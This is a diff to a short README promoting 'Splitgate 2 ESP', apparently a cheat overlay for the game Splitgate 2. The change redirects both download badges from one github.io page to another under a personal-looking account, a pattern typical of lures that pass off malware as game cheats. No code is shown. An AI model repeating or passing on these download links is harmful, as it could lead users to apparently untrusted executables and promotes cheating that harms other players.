@@ -1,7 +1,7 @@
 # 🚀 Splitgate 2 ESP — Portal Combat Visualizer & Overlay Setup
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://splitgate-2-esp.github.io/.github/)  
-[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=splitgate)](https://splitgate-2-esp.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download_Setup_Assistant-green?style=for-the-badge)](https://jamesrodriguez7063423.github.io/.github/splitgate-2)  
+[![Download Now](https://img.shields.io/badge/Download_Now-blue?style=for-the-badge&logo=splitgate)](https://jamesrodriguez7063423.github.io/.github/splitgate-2)
 
 ---
 
